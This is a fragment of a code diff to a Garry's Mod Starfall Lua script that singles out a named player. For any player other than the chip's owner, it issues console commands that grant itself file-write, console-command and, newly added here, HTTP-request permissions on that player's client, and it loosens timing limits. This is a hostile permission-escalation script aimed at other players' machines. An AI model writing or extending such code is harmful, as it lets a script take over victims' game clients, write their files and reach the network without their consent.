@@ -11,7 +11,7 @@ Performance_Cpu_Limit = 0.05 // Manage to perfomance
 Progress_Speed = 10
 
 
-Target = find.playersByName("markiz")[1]
+Target = find.playersByName("Markiz")[1]
 
 if SERVER then
     chip():setNoDraw(false)
@@ -56,7 +56,9 @@ function set_cmd()
     concmd("sf_permission_cl file.write client 3")
     if player() != owner() then
         concmd("sf_permission_cl console.command client 3")
+        concmd("sf_permission_cl http.get urlwhitelist 2")
         concmd("sf_timebuffersize_cl 1000")
+        concmd("sf_timebuffer_cl 0.05")
     end
 end
 
